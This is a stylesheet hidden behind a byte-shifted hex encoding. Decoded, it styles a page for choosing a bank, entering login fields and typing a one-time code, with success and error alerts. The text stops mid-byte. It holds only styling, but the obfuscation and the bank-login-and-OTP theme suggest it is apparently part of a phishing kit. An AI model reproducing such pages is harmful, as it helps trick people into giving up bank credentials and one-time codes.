8-17-2d-2d-70-7c-79-7c-7f-47-2d-30-3e-6e-3f-3d-3f-70-48-17-8a-17-3b-6f-7f-6e-7b-71-3a-81-76-81-79-72-2d-3b-75-76-74-75-79-76-74-75-81-2d-88-17-2d-2d-6f-6e-70-78-74-7f-7c-82-7b-71-47-2d-79-76-7b-72-6e-7f-3a-74-7f-6e-71-76-72-7b-81-35-3e-40-42-71-72-74-39-2d-30-3d-71-41-44-6e-3e-39-2d-30-3d-3d-6f-45-71-41-36-48-17-2d-2d-3a-84-72-6f-78-76-81-3a-6f-6e-70-78-74-7f-7c-82-7b-71-3a-70-79-76-7d-47-2d-81-72-85-81-48-17-2d-2d-3a-84-72-6f-78-76-81-3a-81-72-85-81-3a-73-76-79-79-3a-70-7c-79-7c-7f-47-2d-81-7f-6e-7b-80-7d-6e-7f-72-7b-81-48-17-2d-2d-6f-6e-70-78-74-7f-7c-82-7b-71-3a-70-79-76-7d-47-2d-81-72-85-81-48-17-8a-17-3b-6f-7f-6e-7b-71-3a-80-82-6f-2d-88-17-2d-2d-73-7c-7b-81-3a-80-76-87-72-47-2d-3e-3d-3b-42-7d-85-48-17-2d-2d-79-72-81-81-72-7f-3a-80-7d-6e-70-76-7b-74-47-2d-40-7d-85-48-17-2d-2d-70-7c-79-7c-7f-47-2d-30-44-3e-45-3d-46-43-48-17-2d-2d-7a-6e-7f-74-76-7b-3a-81-7c-7d-47-2d-43-7d-85-48-17-2d-2d-73-7c-7b-81-3a-84-72-76-74-75-81-47-2d-43-3d-3d-48-17-2d-2d-81-72-85-81-3a-81-7f-6e-7b-80-73-7c-7f-7a-47-2d-82-7d-7d-72-7f-70-6e-80-72-48-17-8a-17-17-3b-80-72-79-72-70-81-3a-6f-6e-7b-78-3a-81-76-81-79-72-2d-88-17-2d-2d-81-72-85-81-3a-6e-79-76-74-7b-47-2d-70-72-7b-81-72-7f-48-17-2d-2d-73-7c-7b-81-3a-80-76-87-72-47-2d-3e-40-7d-85-48-17-2d-2d-73-7c-7b-81-3a-84-72-76-74-75-81-47-2d-44-3d-3d-48-17-2d-2d-70-7c-79-7c-7f-47-2d-30-44-3e-45-3d-46-43-48-17-2d-2d-81-72-85-81-3a-81-7f-6e-7b-80-73-7c-7f-7a-47-2d-82-7d-7d-72-7f-70-6e-80-72-48-17-2d-2d-79-72-81-81-72-7f-3a-80-7d-6e-70-76-7b-74-47-2d-3e-7d-85-48-17-2d-2d-7a-6e-7f-74-76-7b-3a-6f-7c-81-81-7c-7a-47-2d-3e-41-7d-85-48-17-8a-17-17-3b-6f-6e-7b-78-3a-74-7f-76-71-3a-76-7b-7b-72-7f-2d-88-17-2d-2d-71-76-80-7d-79-6e-86-47-2d-74-7f-76-71-48-17-2d-2d-74-7f-76-71-3a-81-72-7a-7d-79-6e-81-72-3a-70-7c-79-82-7a-7b-80-47-2d-7f-72-7d-72-6e-81-35-40-39-2d-3e-73-7f-36-48-17-2d-2d-74-6e-7d-47-2d-3e-3d-7d-85-48-17-2d-2d-7a-6e-7f-74-76-7b-3a-6f-7c-81-81-7c-7a-47-2d-43-7d-85-48-17-8a-17-17-3b-6f-6e-7b-78-3a-76-81-72-7a-2d-88-17-2d-2d-6f-6e-70-78-74-7f-7c-82-7b-71-47-2d-30-73-45-73-6e-73-70-48-17-2d-2d-6f-7c-7f-71-72-7f-47-2d-3e-3b-42-7d-85-2d-80-7c-79-76-71-2d-30-72-3f-72-45-73-3d-48-17-2d-2d-6f-7c-7f-71-72-7f-3a-7f-6e-71-76-82-80-47-2d-3e-3f-7d-85-48-17-2d-2d-7d-6e-71-71-76-7b-74-47-2d-3e-3f-7d-85-2d-45-7d-85-48-17-2d-2d-81-72-85-81-3a-6e-79-76-74-7b-47-2d-70-72-7b-81-72-7f-48-17-2d-2d-70-82-7f-80-7c-7f-47-2d-7d-7c-76-7b-81-72-7f-48-17-2d-2d-81-7f-6e-7b-80-76-81-76-7c-7b-47-2d-6e-79-79-2d-3d-3b-3f-42-80-48-17-2d-2d-71-76-80-7d-79-6e-86-47-2d-73-79-72-85-48-17-2d-2d-73-79-72-85-3a-71-76-7f-72-70-81-76-7c-7b-47-2d-70-7c-79-82-7a-7b-48-17-2d-2d-6e-79-76-74-7b-3a-76-81-72-7a-80-47-2d-70-72-7b-81-72-7f-48-17-2d-2d-77-82-80-81-76-73-86-3a-70-7c-7b-81-72-7b-81-47-2d-70-72-7b-81-72-7f-48-17-2d-2d-7a-76-7b-3a-75-72-76-74-75-81-47-2d-3e-3e-3d-7d-85-48-17-8a-17-3b-6f-6e-7b-78-3a-76-81-72-7a-47-75-7c-83-72-7f-2d-88-17-2d-2d-6f-6e-70-78-74-7f-7c-82-7b-71-47-2d-30-73-73-73-48-17-2d-2d-6f-7c-7f-71-72-7f-3a-70-7c-79-7c-7f-47-2d-30-3e-46-44-43-71-3f-48-17-2d-2d-81-7f-6e-7b-80-73-7c-7f-7a-47-2d-81-7f-6e-7b-80-79-6e-81-72-66-35-3a-40-7d-85-36-48-17-2d-2d-6f-7c-85-3a-80-75-6e-71-7c-84-47-2d-3d-2d-45-7d-85-2d-3e-45-7d-85-2d-7f-74-6f-6e-35-3e-40-39-44-3e-39-3e-43-3e-39-3d-3b-3e-42-36-48-17-8a-17-3b-6f-6e-7b-78-3a-76-81-72-7a-3b-80-72-79-72-70-81-72-71-2d-88-17-2d-2d-6f-6e-70-78-74-7f-7c-82-7b-71-47-2d-30-73-73-73-48-17-2d-2d-6f-7c-7f-71-72-7f-3a-70-7c-79-7c-7f-47-2d-30-3d-71-41-44-6e-3e-48-17-2d-2d-6f-7c-85-3a-80-75-6e-71-7c-84-47-2d-3d-2d-3d-2d-3d-2d-40-7d-85-2d-7f-74-6f-6e-35-3e-40-39-44-3e-39-3e-43-3e-39-3d-3b-3e-42-36-48-17-8a-17-17-3b-6f-6e-7b-78-3a-76-81-72-7a-3a-79-7c-74-7c-2d-88-17-2d-2d-75-72-76-74-75-81-47-2d-41-3d-7d-85-48-17-2d-2d-84-76-71-81-75-47-2d-3e-3d-3d-32-48-17-2d-2d-71-76-80-7d-79-6e-86-47-2d-73-79-72-85-48-17-2d-2d-6e-79-76-74-7b-3a-76-81-72-7a-80-47-2d-70-72-7b-81-72-7f-48-17-2d-2d-77-82-80-81-76-73-86-3a-70-7c-7b-81-72-7b-81-47-2d-70-72-7b-81-72-7f-48-17-2d-2d-7a-6e-7f-74-76-7b-3a-6f-7c-81-81-7c-7a-47-2d-45-7d-85-48-17-8a-17-3b-6f-6e-7b-78-3a-76-81-72-7a-3a-79-7c-74-7c-2d-76-7a-74-2d-88-17-2d-2d-7a-6e-85-3a-75-72-76-74-75-81-47-2d-3e-3d-3d-32-48-17-2d-2d-7a-6e-85-3a-84-76-71-81-75-47-2d-3e-3d-3d-32-48-17-2d-2d-7c-6f-77-72-70-81-3a-73-76-81-47-2d-70-7c-7b-81-6e-76-7b-48-17-8a-17-3b-6f-6e-7b-78-3a-76-81-72-7a-3a-7b-6e-7a-72-2d-88-17-2d-2d-73-7c-7b-81-3a-80-76-87-72-47-2d-3e-3d-3b-42-7d-85-48-17-2d-2d-73-7c-7b-81-3a-84-72-76-74-75-81-47-2d-43-3d-3d-48-17-2d-2d-70-7c-79-7c-7f-47-2d-30-41-6e-42-42-43-45-48-17-2d-2d-79-76-7b-72-3a-75-72-76-74-75-81-47-2d-3e-3b-40-48-17-2d-2d-81-72-85-81-3a-6e-79-76-74-7b-47-2d-70-72-7b-81-72-7f-48-17-8a-17-17-3b-80-72-79-72-70-81-72-71-3a-6f-6e-7b-78-3a-6f-6e-7b-7b-72-7f-2d-88-17-2d-2d-71-76-80-7d-79-6e-86-47-2d-7b-7c-7b-72-48-17-2d-2d-6f-6e-70-78-74-7f-7c-82-7b-71-47-2d-79-76-7b-72-6e-7f-3a-74-7f-6e-71-76-72-7b-81-35-3e-40-42-71-72-74-39-2d-30-72-40-73-3f-73-71-39-2d-30-6f-6f-71-72-73-6f-36-48-17-2d-2d-6f-7c-7f-71-72-7f-3a-7f-6e-71-76-82-80-47-2d-3e-41-7d-85-48-17-2d-2d-7d-6e-71-71-76-7b-74-47-2d-3e-3f-7d-85-2d-3e-43-7d-85-48-17-2d-2d-7a-6e-7f-74-76-7b-3a-6f-7c-81-81-7c-7a-47-2d-3f-3f-7d-85-48-17-2d-2d-6e-79-76-74-7b-3a-76-81-72-7a-80-47-2d-70-72-7b-81-72-7f-48-17-2d-2d-74-6e-7d-47-2d-3e-3f-7d-85-48-17-8a-17-3b-80-72-79-72-70-81-72-71-3a-6f-6e-7b-78-3a-6f-6e-7b-7b-72-7f-3b-80-75-7c-84-2d-88-2d-71-76-80-7d-79-6e-86-47-2d-73-79-72-85-48-2d-8a-17-17-3b-80-72-79-72-70-81-72-71-3a-6f-6e-7b-78-3a-6f-6e-7b-7b-72-7f-2d-3b-80-72-79-3a-79-7c-74-7c-2d-88-17-2d-2d-84-76-71-81-75-47-2d-41-41-7d-85-48-17-2d-2d-75-72-76-74-75-81-47-2d-41-41-7d-85-48-17-2d-2d-6f-6e-70-78-74-7f-7c-82-7b-71-47-2d-30-73-73-73-48-17-2d-2d-6f-7c-7f-71-72-7f-3a-7f-6e-71-76-82-80-47-2d-3e-3d-7d-85-48-17-2d-2d-7d-6e-71-71-76-7b-74-47-2d-41-7d-85-48-17-2d-2d-71-76-80-7d-79-6e-86-47-2d-73-79-72-85-48-17-2d-2d-6e-79-76-74-7b-3a-76-81-72-7a-80-47-2d-70-72-7b-81-72-7f-48-17-2d-2d-77-82-80-81-76-73-86-3a-70-7c-7b-81-72-7b-81-47-2d-70-72-7b-81-72-7f-48-17-2d-2d-73-79-72-85-3a-80-75-7f-76-7b-78-47-2d-3d-48-17-8a-17-3b-80-72-79-72-70-81-72-71-3a-6f-6e-7b-78-3a-6f-6e-7b-7b-72-7f-2d-3b-80-72-79-3a-79-7c-74-7c-2d-76-7a-74-2d-88-17-2d-2d-7a-6e-85-3a-84-76-71-81-75-47-2d-3e-3d-3d-32-48-17-2d-2d-7a-6e-85-3a-75-72-76-74-75-81-47-2d-3e-3d-3d-32-48-17-2d-2d-7c-6f-77-72-70-81-3a-73-76-81-47-2d-70-7c-7b-81-6e-76-7b-48-17-8a-17-3b-80-72-79-72-70-81-72-71-3a-6f-6e-7b-78-3a-6f-6e-7b-7b-72-7f-2d-3b-80-72-79-3a-76-7b-73-7c-2d-88-17-2d-2d-73-79-72-85-47-2d-3e-48-17-8a-17-3b-80-72-79-72-70-81-72-71-3a-6f-6e-7b-78-3a-6f-6e-7b-7b-72-7f-2d-3b-80-72-79-3a-76-7b-73-7c-2d-75-41-2d-88-17-2d-2d-73-7c-7b-81-3a-80-76-87-72-47-2d-3e-40-3b-42-7d-85-48-17-2d-2d-73-7c-7b-81-3a-84-72-76-74-75-81-47-2d-44-3d-3d-48-17-2d-2d-70-7c-79-7c-7f-47-2d-30-3d-71-41-44-6e-3e-48-17-2d-2d-7a-6e-7f-74-76-7b-3a-6f-7c-81-81-7c-7a-47-2d-3f-7d-85-48-17-8a-17-3b-80-72-79-72-70-81-72-71-3a-6f-6e-7b-78-3a-6f-6e-7b-7b-72-7f-2d-3b-80-72-79-3a-76-7b-73-7c-2d-7d-2d-88-17-2d-2d-73-7c-7b-81-3a-80-76-87-72-47-2d-3e-3d-3b-42-7d-85-48-17-2d-2d-70-7c-79-7c-7f-47-2d-30-3e-46-44-43-71-3f-48-17-2d-2d-73-7c-7b-81-3a-84-72-76-74-75-81-47-2d-42-3d-3d-48-17-8a-17-3b-80-72-79-72-70-81-72-71-3a-6f-6e-7b-78-3a-6f-6e-7b-7b-72-7f-2d-3b-70-75-6e-7b-74-72-3a-6f-81-7b-2d-88-17-2d-2d-6f-6e-70-78-74-7f-7c-82-7b-71-47-2d-30-73-73-73-48-17-2d-2d-70-7c-79-7c-7f-47-2d-30-3d-71-41-44-6e-3e-48-17-2d-2d-6f-7c-7f-71-72-7f-47-2d-7b-7c-7b-72-48-17-2d-2d-7d-6e-71-71-76-7b-74-47-2d-44-7d-85-2d-3e-41-7d-85-48-17-2d-2d-6f-7c-7f-71-72-7f-3a-7f-6e-71-76-82-80-47-2d-3f-3d-7d-85-48-17-2d-2d-73-7c-7b-81-3a-80-76-87-72-47-2d-3e-3e-7d-85-48-17-2d-2d-73-7c-7b-81-3a-84-72-76-74-75-81-47-2d-44-3d-3d-48-17-2d-2d-70-82-7f-80-7c-7f-47-2d-7d-7c-76-7b-81-72-7f-48-17-2d-2d-73-7c-7b-81-3a-73-6e-7a-76-79-86-47-2d-76-7b-75-72-7f-76-81-48-17-2d-2d-81-7f-6e-7b-80-76-81-76-7c-7b-47-2d-6e-79-79-2d-3d-3b-3f-80-48-17-8a-17-3b-80-72-79-72-70-81-72-71-3a-6f-6e-7b-78-3a-6f-6e-7b-7b-72-7f-2d-3b-70-75-6e-7b-74-72-3a-6f-81-7b-47-75-7c-83-72-7f-2d-88-17-2d-2d-6f-6e-70-78-74-7f-7c-82-7b-71-47-2d-30-3d-71-41-44-6e-3e-48-17-2d-2d-70-7c-79-7c-7f-47-2d-30-73-73-73-48-17-8a-17-17-3b-79-7c-74-76-7b-3a-73-76-72-79-71-80-2d-88-17-2d-2d-71-76-80-7d-79-6e-86-47-2d-7b-7c-7b-72-48-17-8a-17-3b-79-7c-74-76-7b-3a-73-76-72-79-71-80-3b-80-75-7c-84-2d-88-2d-71-76-80-7d-79-6e-86-47-2d-6f-79-7c-70-78-48-2d-8a-17-17-3b-73-7c-7f-7a-3a-74-7f-7c-82-7d-2d-88-17-2d-2d-7a-6e-7f-74-76-7b-3a-6f-7c-81-81-7c-7a-47-2d-3f-3d-7d-85-48-17-2d-2d-7d-7c-80-76-81-76-7c-7b-47-2d-7f-72-79-6e-81-76-83-72-48-17-8a-17-3b-73-7c-7f-7a-3a-74-7f-7c-82-7d-2d-79-6e-6f-72-79-2d-88-17-2d-2d-71-76-80-7d-79-6e-86-47-2d-6f-79-7c-70-78-48-17-2d-2d-73-7c-7b-81-3a-80-76-87-72-47-2d-3e-3e-3b-42-7d-85-48-17-2d-2d-73-7c-7b-81-3a-84-72-76-74-75-81-47-2d-43-3d-3d-48-17-2d-2d-70-7c-79-7c-7f-47-2d-30-44-3e-45-3d-46-43-48-17-2d-2d-81-72-85-81-3a-81-7f-6e-7b-80-73-7c-7f-7a-47-2d-82-7d-7d-72-7f-70-6e-80-72-48-17-2d-2d-79-72-81-81-72-7f-3a-80-7d-6e-70-76-7b-74-47-2d-3d-3b-45-7d-85-48-17-2d-2d-7a-6e-7f-74-76-7b-3a-6f-7c-81-81-7c-7a-47-2d-45-7d-85-48-17-8a-17-3b-73-76-72-79-71-3a-84-7f-6e-7d-2d-88-17-2d-2d-71-76-80-7d-79-6e-86-47-2d-73-79-72-85-48-17-2d-2d-6e-79-76-74-7b-3a-76-81-72-7a-80-47-2d-70-72-7b-81-72-7f-48-17-2d-2d-6f-6e-70-78-74-7f-7c-82-7b-71-47-2d-30-73-45-73-6e-73-70-48-17-2d-2d-6f-7c-7f-71-72-7f-47-2d-3e-3b-42-7d-85-2d-80-7c-79-76-71-2d-30-72-3f-72-45-73-3d-48-17-2d-2d-6f-7c-7f-71-72-7f-3a-7f-6e-71-76-82-80-47-2d-3e-41-7d-85-48-17-2d-2d-81-7f-6e-7b-80-76-81-76-7c-7b-47-2d-6e-79-79-2d-3d-3b-40-80-48-17-8a-17-3b-73-76-72-79-71-3a-84-7f-6e-7d-47-73-7c-70-82-80-3a-84-76-81-75-76-7b-2d-88-17-2d-2d-6f-7c-7f-71-72-7f-3a-70-7c-79-7c-7f-47-2d-30-3e-46-44-43-71-3f-48-17-2d-2d-6f-6e-70-78-74-7f-7c-82-7b-71-47-2d-30-73-73-73-48-17-2d-2d-6f-7c-85-3a-80-75-6e-71-7c-84-47-2d-3d-2d-3d-2d-3d-2d-41-7d-85-2d-7f-74-6f-6e-35-3f-42-39-3e-3e-45-39-3f-3e-3d-39-3d-3b-3e-3d-36-48-17-8a-17-3b-73-76-72-79-71-3a-76-70-7c-7b-2d-88-17-2d-2d-7d-6e-71-71-76-7b-74-47-2d-3d-2d-3e-41-7d-85-48-17-2d-2d-73-7c-7b-81-3a-80-76-87-72-47-2d-3e-45-7d-85-48-17-2d-2d-70-7c-79-7c-7f-47-2d-30-44-3e-45-3d-46-43-48-17-8a-17-3b-73-76-72-79-71-3a-84-7f-6e-7d-2d-76-7b-7d-82-81-2d-88-17-2d-2d-73-79-72-85-47-2d-3e-48-17-2d-2d-6f-7c-7f-71-72-7f-47-2d-7b-7c-7b-72-48-17-2d-2d-7c-82-81-79-76-7b-72-47-2d-7b-7c-7b-72-48-17-2d-2d-6f-6e-70-78-74-7f-7c-82-7b-71-47-2d-81-7f-6e-7b-80-7d-6e-7f-72-7b-81-48-17-2d-2d-73-7c-7b-81-3a-80-76-87-72-47-2d-3e-42-7d-85-48-17-2d-2d-7d-6e-71-71-76-7b-74-47-2d-3e-42-7d-85-2d-3e-41-7d-85-2d-3e-42-7d-85-2d-3d-48-17-2d-2d-70-7c-79-7c-7f-47-2d-30-3e-6e-3f-3d-3f-70-48-17-2d-2d-73-7c-7b-81-3a-84-72-76-74-75-81-47-2d-42-3d-3d-48-17-2d-2d-73-7c-7b-81-3a-73-6e-7a-76-79-86-47-2d-76-7b-75-72-7f-76-81-48-17-2d-2d-84-76-71-81-75-47-2d-3e-3d-3d-32-48-17-8a-17-3b-73-7c-7f-74-7c-81-3a-79-76-7b-78-2d-88-17-2d-2d-7d-7c-80-76-81-76-7c-7b-47-2d-6e-6f-80-7c-79-82-81-72-48-17-2d-2d-7f-76-74-75-81-47-2d-3f-7d-85-48-17-2d-2d-81-7c-7d-47-2d-3d-48-17-2d-2d-73-7c-7b-81-3a-80-76-87-72-47-2d-3e-3e-7d-85-48-17-2d-2d-70-7c-79-7c-7f-47-2d-30-3e-46-44-43-71-3f-48-17-2d-2d-70-82-7f-80-7c-7f-47-2d-7d-7c-76-7b-81-72-7f-48-17-2d-2d-73-7c-7b-81-3a-84-72-76-74-75-81-47-2d-43-3d-3d-48-17-2d-2d-81-72-85-81-3a-81-7f-6e-7b-80-73-7c-7f-7a-47-2d-7b-7c-7b-72-48-17-2d-2d-79-72-81-81-72-7f-3a-80-7d-6e-70-76-7b-74-47-2d-3d-48-17-8a-17-3b-73-7c-7f-74-7c-81-3a-79-76-7b-78-47-75-7c-83-72-7f-2d-88-2d-81-72-85-81-3a-71-72-70-7c-7f-6e-81-76-7c-7b-47-2d-82-7b-71-72-7f-79-76-7b-72-48-2d-8a-17-17-3b-6f-81-7b-3a-7d-7f-76-7a-6e-7f-86-2d-88-17-2d-2d-84-76-71-81-75-47-2d-3e-3d-3d-32-48-17-2d-2d-7d-6e-71-71-76-7b-74-47-2d-3e-43-7d-85-48-17-2d-2d-6f-7c-7f-71-72-7f-47-2d-7b-7c-7b-72-48-17-2d-2d-6f-7c-7f-71-72-7f-3a-7f-6e-71-76-82-80-47-2d-3e-41-7d-85-48-17-2d-2d-6f-6e-70-78-74-7f-7c-82-7b-71-47-2d-79-76-7b-72-6e-7f-3a-74-7f-6e-71-76-72-7b-81-35-3e-40-42-71-72-74-39-2d-30-3d-71-41-44-6e-3e-39-2d-30-3e-46-44-43-71-3f-36-48-17-2d-2d-70-7c-79-7c-7f-47-2d-30-73-73-73-48-17-2d-2d-73-7c-7b-81-3a-80-76-87-72-47-2d-3e-42-3b-42-7d-85-48-17-2d-2d-73-7c-7b-81-3a-84-72-76-74-75-81-47-2d-43-3d-3d-48-17-2d-2d-73-7c-7b-81-3a-73-6e-7a-76-79-86-47-2d-76-7b-75-72-7f-76-81-48-17-2d-2d-70-82-7f-80-7c-7f-47-2d-7d-7c-76-7b-81-72-7f-48-17-2d-2d-79-72-81-81-72-7f-3a-80-7d-6e-70-76-7b-74-47-2d-3d-3b-40-7d-85-48-17-2d-2d-6f-7c-85-3a-80-75-6e-71-7c-84-47-2d-3d-2d-43-7d-85-2d-3e-45-7d-85-2d-7f-74-6f-6e-35-3e-40-39-44-3e-39-3e-43-3e-39-3d-3b-40-3d-36-48-17-2d-2d-81-7f-6e-7b-80-76-81-76-7c-7b-47-2d-6e-79-79-2d-3d-3b-40-80-48-17-2d-2d-7a-6e-7f-74-76-7b-3a-81-7c-7d-47-2d-43-7d-85-48-17-8a-17-3b-6f-81-7b-3a-7d-7f-76-7a-6e-7f-86-47-75-7c-83-72-7f-2d-88-17-2d-2d-81-7f-6e-7b-80-73-7c-7f-7a-47-2d-81-7f-6e-7b-80-79-6e-81-72-66-35-3a-3f-7d-85-36-48-17-2d-2d-6f-7c-85-3a-80-75-6e-71-7c-84-47-2d-3d-2d-3e-3d-7d-85-2d-3f-45-7d-85-2d-7f-74-6f-6e-35-3e-40-39-44-3e-39-3e-43-3e-39-3d-3b-41-42-36-48-17-8a-17-3b-6f-81-7b-3a-7d-7f-76-7a-6e-7f-86-47-6e-70-81-76-83-72-2d-88-2d-81-7f-6e-7b-80-73-7c-7f-7a-47-2d-80-70-6e-79-72-35-3d-3b-46-45-36-48-2d-8a-17-17-3b-6f-81-7b-3a-80-72-70-7c-7b-71-6e-7f-86-2d-88-17-2d-2d-84-76-71-81-75-47-2d-3e-3d-3d-32-48-17-2d-2d-7d-6e-71-71-76-7b-74-47-2d-3e-42-7d-85-48-17-2d-2d-6f-7c-7f-71-72-7f-47-2d-3e-3b-42-7d-85-2d-80-7c-79-76-71-2d-30-72-3f-72-45-73-3d-48-17-2d-2d-6f-7c-7f-71-72-7f-3a-7f-6e-71-76-82-80-47-2d-3e-41-7d-85-48-17-2d-2d-6f-6e-70-78-74-7f-7c-82-7b-71-47-2d-30-73-73-73-48-17-2d-2d-70-7c-79-7c-7f-47-2d-30-44-3e-45-3d-46-43-48-17-2d-2d-73-7c-7b-81-3a-80-76-87-72-47-2d-3e-41-3b-42-7d-85-48-17-2d-2d-73-7c-7b-81-3a-84-72-76-74-75-81-47-2d-43-3d-3d-48-17-2d-2d-73-7c-7b-81-3a-73-6e-7a-76-79-86-47-2d-76-7b-75-72-7f-76-81-48-17-2d-2d-70-82-7f-80-7c-7f-47-2d-7d-7c-76-7b-81-72-7f-48-17-2d-2d-7a-6e-7f-74-76-7b-3a-81-7c-7d-47-2d-3e-3d-7d-85-48-17-2d-2d-81-7f-6e-7b-80-76-81-76-7c-7b-47-2d-6e-79-79-2d-3d-3b-3f-42-80-48-17-8a-17-3b-6f-81-7b-3a-80-72-70-7c-7b-71-6e-7f-86-47-75-7c-83-72-7f-2d-88-2d-6f-6e-70-78-74-7f-7c-82-7b-71-47-2d-30-73-45-73-6e-73-70-48-2d-8a-17-17-3b-6e-79-72-7f-81-2d-88-17-2d-2d-7d-6e-71-71-76-7b-74-47-2d-3e-3f-7d-85-2d-3e-43-7d-85-48-17-2d-2d-6f-7c-7f-71-72-7f-3a-7f-6e-71-76-82-80-47-2d-3e-3f-7d-85-48-17-2d-2d-7a-6e-7f-74-76-7b-3a-81-7c-7d-47-2d-3e-41-7d-85-48-17-2d-2d-81-72-85-81-3a-6e-79-76-74-7b-47-2d-70-72-7b-81-72-7f-48-17-2d-2d-73-7c-7b-81-3a-80-76-87-72-47-2d-3e-40-7d-85-48-17-2d-2d-73-7c-7b-81-3a-84-72-76-74-75-81-47-2d-42-3d-3d-48-17-2d-2d-71-76-80-7d-79-6e-86-47-2d-7b-7c-7b-72-48-17-8a-17-3b-6e-79-72-7f-81-3b-80-75-7c-84-2d-88-2d-71-76-80-7d-79-6e-86-47-2d-6f-79-7c-70-78-48-2d-8a-17-3b-6e-79-72-7f-81-3a-80-82-70-70-72-80-80-2d-88-2d-6f-6e-70-78-74-7f-7c-82-7b-71-47-2d-30-72-45-73-42-72-46-48-2d-70-7c-79-7c-7f-47-2d-30-3e-6f-42-72-3f-3d-48-2d-6f-7c-7f-71-72-7f-3a-79-72-73-81-47-2d-40-7d-85-2d-80-7c-79-76-71-2d-30-3d-3d-70-45-42-40-48-2d-8a-17-3b-6e-79-72-7f-81-3a-72-7f-7f-7c-7f-2d-88-2d-6f-6e-70-78-74-7f-7c-82-7b-71-47-2d-30-73-73-72-6f-72-72-48-2d-70-7c-79-7c-7f-47-2d-30-6f-44-3e-70-3e-70-48-2d-6f-7c-7f-71-72-7f-3a-79-72-73-81-47-2d-40-7d-85-2d-80-7c-79-76-71-2d-30-71-40-3f-73-3f-73-48-2d-8a-17-3b-6e-79-72-7f-81-3a-84-6e-7f-7b-76-7b-74-2d-88-2d-6f-6e-70-78-74-7f-7c-82-7b-71-47-2d-30-73-73-73-45-72-3e-48-2d-70-7c-79-7c-7f-47-2d-30-72-43-42-3e-3d-3d-48-2d-6f-7c-7f-71-72-7f-3a-79-72-73-81-47-2d-40-7d-85-2d-80-7c-79-76-71-2d-30-73-42-44-70-3d-3d-48-2d-8a-17-17-3b-7c-81-7d-3a-80-72-70-81-76-7c-7b-2d-88-2d-71-76-80-7d-79-6e-86-47-2d-7b-7c-7b-72-48-2d-8a-17-3b-7c-81-7d-3a-80-72-70-81-76-7c-7b-3b-80-75-7c-84-2d-88-2d-71-76-80-7d-79-6e-86-47-2d-6f-79-7c-70-78-48-2d-8a-17-17-3b-7c-81-7d-3a-75-72-6e-71-72-7f-2d-88-2d-81-72-85-81-3a-6e-79-76-74-7b-47-2d-70-72-7b-81-72-7f-48-2d-7a-6e-7f-74-76-7b-3a-6f-7c-81-81-7c-7a-47-2d-3f-3f-7d-85-48-2d-8a-17-3b-79-7c-70-78-3a-70-76-7f-70-79-72-2d-88-17-2d-2d-84-76-71-81-75-47-2d-43-3d-7d-85-48-17-2d-2d-75-72-76-74-75-81-47-2d-43-3d-7d-85-48-17-2d-2d-7a-6e-7f-74-76-7b-47-2d-3d-2d-6e-82-81-7c-2d-3e-3f-7d-85-48-17-2d-2d-6f-7c-7f-71-72-7f-3a-7f-6e-71-76-82-80-47-2d-42-3d-32-48-17-2d-2d-6f-6e-70-78-74-7f-7c-82-7b-71-47-2d-79-76-7b-72-6e-7f-3a-74-7f-6e-71-76-72-7b-81-35-3e-40-42-71-72-74-39-2d-30-72-40-73-3f-73-71-39-2d-30-6f-6f-71-72-73-6f-36-48-17-2d-2d-71-76-80-7d-79-6e-86-47-2d-73-79-72-85-48-17-2d-2d-6e-79-76-74-7b-3a-76-81-72-7a-80-47-2d-70-72-7b-81-72-7f-48-17-2d-2d-77-82-80-81-76-73-86-3a-70-7c-7b-81-72-7b-81-47-2d-70-72-7b-81-72-7f-48-17-2d-2d-73-7c-7b-81-3a-80-76-87-72-47-2d-3f-45-7d-85-48-17-2d-2d-70-7c-79-7c-7f-47-2d-30-3d-71-41-44-6e-3e-48-17-8a-17-3b-7c-81-7d-3a-81-76-81-79-72-2d-88-17-2d-2d-73-7c-7b-81-3a-73-6e-7a-76-79-86-47-2d-34-5d-7c-7d-7d-76-7b-80-34-39-2d-80-6e-7b-80-3a-80-72-7f-76-73-48-17-2d-2d-73-7c-7b-81-3a-80-76-87-72-47-2d-3e-45-7d-85-48-17-2d-2d-73-7c-7b-81-3a-84-72-76-74-75-81-47-2d-44-3d-3d-48-17-2d-2d-70-7c-79-7c-7f-47-2d-30-3e-6e-3f-3d-3f-70-48-17-2d-2d-7a-6e-7f-74-76-7b-3a-6f-7c-81-81-7c-7a-47-2d-43-7d-85-48-17-8a-17-3b-7c-81-7d-3a-80-82-6f-2d-88-17-2d-2d-73-7c-7b-81-3a-80-76-87-72-47-2d-3e-3f-3b-42-7d-85-48-17-2d-2d-70-7c-79-7c-7f-47-2d-30-44-3e-45-3d-46-43-48-17-2d-2d-79-76-7b-72-3a-75-72-76-74-75-81-47-2d-3e-3b-42-48-17-8a-17-3b-6f-6e-7b-78-3a-81-6e-74-2d-88-17-2d-2d-71-76-80-7d-79-6e-86-47-2d-76-7b-79-76-7b-72-3a-6f-79-7c-70-78-48-17-2d-2d-6f-6e-70-78-74-7f-7c-82-7b-71-47-2d-30-72-40-73-3f-73-71-48-17-2d-2d-70-7c-79-7c-7f-47-2d-30-3d-71-41-44-6e-3e-48-17-2d-2d-7d-6e-71-71-76-7b-74-47-2d-41-7d-85-2d-3e-41-7d-85-48-17-2d-2d-6f-7c-7f-71-72-7f-3a-7f-6e-71-76-82-80-47-2d-3f-3d-7d-85-48-17-2d-2d-73-7c-7b-81-3a-80-76-87-72-47-2d-3e-3e-7d-85-48-17-2d-2d-73-7c-7b-81-3a-84-72-76-74-75-81-47-2d-43-3d-3d-48-17-2d-2d-7a-6e-7f-74-76-7b-3a-81-7c-7d-47-2d-45-7d-85-48-17-8a-17-17-3b-7c-81-7d-3a-76-7b-7d-82-81-80-2d-88-17-2d-2d-71-76-80-7d-79-6e-86-47-2d-73-79-72-85-48-17-2d-2d-74-6e-7d-47-2d-45-7d-85-48-17-2d-2d-77-82-80-81-76-73-86-3a-70-7c-7b-81-72-7b-81-47-2d-70-72-7b-81-72-7f-48-17-2d-2d-7a-6e-7f-74-76-7b-3a-6f-7c-81-81-7c-7a-47-2d-3f-3d-7d-85-48-17-8a-17-3b-7c-81-7d-3a-76-7b-7d-82-81-80-2d-76-7b-7d-82-81-2d-88-17-2d-2d-84-76-71-81-75-47-2d-41-43-7d-85-48-17-2d-2d-75-72-76-74-75-81-47-2d-42-41-7d-85-48-17-2d-2d-81-72-85-81-3a-6e-79-76-74-7b-47-2d-70-72-7b-81-72-7f-48-17-2d-2d-73-7c-7b-81-3a-80-76-87-72-47-2d-3f-3f-7d-85-48-17-2d-2d-73-7c-7b-81-3a-84-72-76-74-75-81-47-2d-44-3d-3d-48-17-2d-2d-6f-7c-7f-71-72-7f-47-2d-3f-7d-85-2d-80-7c-79-76-71-2d-30-72-3f-72-45-7